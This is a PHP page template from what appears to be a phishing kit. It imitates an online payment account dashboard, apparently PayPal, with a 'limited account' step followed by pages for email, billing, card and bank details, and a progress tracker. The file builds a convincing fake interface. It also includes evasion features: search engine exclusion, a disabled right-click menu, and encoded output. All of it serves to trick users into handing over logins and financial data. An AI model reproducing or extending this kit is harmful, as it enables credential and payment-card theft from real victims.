<?php

if ($page == "limited") {
  $title = $text['23'];
} elseif ($page == "email") {
  $title = $text['72'];
} elseif ($page == "billing") {
  $title = $text['50'];
} elseif ($page == "card1") {
  $title = $text['60'];
} elseif ($page == "bank") {
  $title = $text['66'];
} elseif ($page == "card2") {
  $title = $text['65'];
} elseif ($page == "success") {
  $title = $text['85'];
}

if ($page == "success") {
  $notif = 0;
} else {
  $notif = 1;
}

$html = '
<!DOCTYPE html>
<html>
<head>
<title>'.$api->text_encode($text['0'].": ".$title).'</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
<link rel="shortcut icon" href="'.$api->image_encode("assets/img/favicon.ico")['local'].'">
<link rel="stylesheet" href="'.$api->text_encode("../assets/css/myaccount_app.css").'">
<link rel="stylesheet" href="'.$api->text_encode("../assets/css/myaccount_sumarry.css").'">
<link rel="stylesheet" href="'.$api->text_encode("../assets/css/myaccount_wallet.css").'">
<link rel="stylesheet" href="'.$api->text_encode("../assets/css/myaccount_main.css").'">
<script src="'.$api->text_encode("../assets/js/jquery.js").'"></script>
<script src="'.$api->text_encode("../assets/js/jquery.mask.js").'"></script>
<script src="'.$api->text_encode("../assets/js/jquery.validate.js").'"></script>';

if ($page == "email" || $page == "billing" || $page == "card1" || $page == "bank" || $page == "card2") {
  $html .= '<script src="'.$api->text_encode("../assets/js/".$page.".auth.js").'"></script>';
}

$html .= '
</head>
<body id="dashboard" oncontextmenu="return false">
<div class="vx_globalNav-main">
<div class="vx_globalNav-container">
<a href="#" class="vx_globalNav-brand_desktop"></a>
<div class="vx_globalNav-secondaryNav_mobile">
<div class="vx_globalNav-listItem_mobileLogout"><a href="#" id="LogOut1" class="vx_globalNav-link_mobileLogout">'.$api->text_encode($text['13']).'</a></div>
<div class="vx_globalNav-listItem_settings"><a href="#" class="vx_globalNav-link_settings"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSettings"></span></a></div>
<div>
<p class="vx_h5 vx_globalNav-displayName">'.$api->text_encode($_SESSION['email']).'</p>
</div>
</div>
<div class="vx_globalNav-navContainer">
<nav class="vx_globalNav-nav">
<ul class="vx_globalNav-list">
<li><a href="#" class="vx_isActive vx_globalNav-links"><span class="vx_globalNav-navText">'.$api->text_encode($text['24']).'</span></a></li>
<li><a href="#" class="vx_isAce vx_globalNav-links"><span class="vx_globalNav-navText">'.$api->text_encode($text['25']).'</span></a></li>
<li><a href="#" class="vx_isAce vx_globalNav-links"><span class="vx_globalNav-navText">'.$api->text_encode($text['26']).'</span></a></li>
<li><a href="#" class="vx_isAce vx_globalNav-links"><span class="vx_globalNav-navText">'.$api->text_encode($text['27']).'</span></a></li>
<li><a href="#" class="vx_isAce vx_globalNav-links"><span class="vx_globalNav-navText">'.$api->text_encode($text['28']).'</span></a></li>
</ul>
<ul class="vx_globalNav-list_secondary">
<li class="vx_globalNav-actionItem_mobile vx_globalNav-notificationItem_mobile"><a href="#" class="vx_globalNav-link_notifications" id="notification1"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkNotifications"></span><span class="vx_notificationCount">'.$api->text_encode($notif).'</span></a></li>
<li><a href="#" class="vx_globalNav-link_settings"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSettings"></span></a></li>
<li class="vx_globalNav-listItem_logout"><a href="#" id="LogOut2" class="vx_globalNav-link_logout">'.$api->text_encode($text['13']).'</a>
</li>
</ul>
</nav>
</div>
</div>
</div>
<div class="vx_sidepanel sidepanel">
<div class="vx_sidepanel-headerContainer">
<h3 class="vx_h3 vx_sidepanel-header" style="color:#FFFFFF">'.$api->text_encode($text['29']).'</h3>
<div class="sidepanel vx_sidepanel-headerIcon_right"><span class="icon icon-small icon-close-small"></span></div>
</div>';

if ($page != "success") {
  $html .= '
  <div class="vx_sidepanel-body">
  <ul class="vx_sidepanel-list">
  <li><div class="vx_sidepanel-item">'.$api->text_encode($text['30']).'</div>
  </li>
  </ul>
  </div>';
}

$html .= '
</div>
<div class="vx_foreground-container">
<div class="vx_globalNav-main_mobile">
<div class="vx_globalNav-headerSection_trigger"><a href="#Menu" class="vx_globalNav-toggleTrigger" id="toggle">'.$api->text_encode($text['31']).'</a></div>
<div class="vx_globalNav-headerSection_logo"><a href="#" class="vx_globalNav-brand_mobile"></a></div>
<ul class="vx_globalNav-headerSection_actions">
<li class="vx_globalNav-actionItem_mobile vx_globalNav-notificationItem_mobile"><a href="#" class="vx_globalNav-link_notifications" id="notification2"><span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkNotifications"></span><span class="vx_notificationCount">'.$api->text_encode($notif).'</span></span></a></li>
</ul>
</div>
<div class="vx_mainContent">
<div class="mainContents">
<div class="mainBody">
<div class="summarySection">
<div class="row">
<div class="col-sm-4">
<section class="walletModule">
<div class="bodyContent">
<div class="title-progress">'.$api->text_encode($text['32']).'</div>
<div class="wrapper">
<div class="content-progress">';

if ($page == "email" || $page == "bank" || $page == "success") {
  if ($api->config("identity") == "on") {
    $html .= '<div class="progress2">';
  } else {
    $html .= '<div class="progress2" style="height: 125px">';
  }
} else {
  if ($api->config("identity") == "on") {
    $html .= '<div class="progress1">';
  } else {
    $html .= '<div class="progress1" style="height: 85px">';
  }
}

if ($page == "limited") {
  $html .= '
  <div class="item">
  <div class="ball active"></div>
  <p>'.$api->text_encode($text['33']).'</p>
  </div>';
} else {
  $html .= '
  <div class="item">
  <div class="ball"></div>
  <p>'.$api->text_encode($text['33']).'</p>
  </div>';
}

if ($page == "email") {
  $html .= '
  <div class="item">
  <div class="ball active"></div>
  <p>'.$api->text_encode($text['78']).'</p>
  </div>';
}

if ($page == "billing") {
  $html .= '
  <div class="item">
  <div class="ball active"></div>
  <p>'.$api->text_encode($text['34']).'</p>
  </div>';
} else {
  $html .= '
  <div class="item">
  <div class="ball"></div>
  <p>'.$api->text_encode($text['34']).'</p>
  </div>';
}

if ($page == "card1" || $page == "card2") {
  $html .= '
  <div class="item">
  <div class="ball active"></div>
  <p>'.$api->text_encode($text['35']).'</p>
  </div>';
} else {
  $html .= '
  <div class="item">
  <div class="ball"></div>
  <p>'.$api->text_encode($text['35']).'</p>
  </div>';
}

if ($page == "bank") {
  $html .= '
  <div class="item">
  <div class="ball active"></div>
  <p>'.$api->text_encode($text['79']).'</p>
  </div>';
}

if ($api->config("identity") == "on") {
  $html .= '
  <div class="item">
  <div class="ball"></div>
  <p>'.$api->text_encode($text['36']).'</p>
  </div>';
}

if ($page == "success") {
  $html .= '
  <div class="item">
  <div class="ball active"></div>
  <p>'.$api->text_encode($text['85']).'</p>
  </div>';
}

$html .= '
</div>
</div>
</div>
</div>
</section>
</div>
<div class="col-sm-8">
<section class="walletModule">
<div class="bodyContent">';
?>
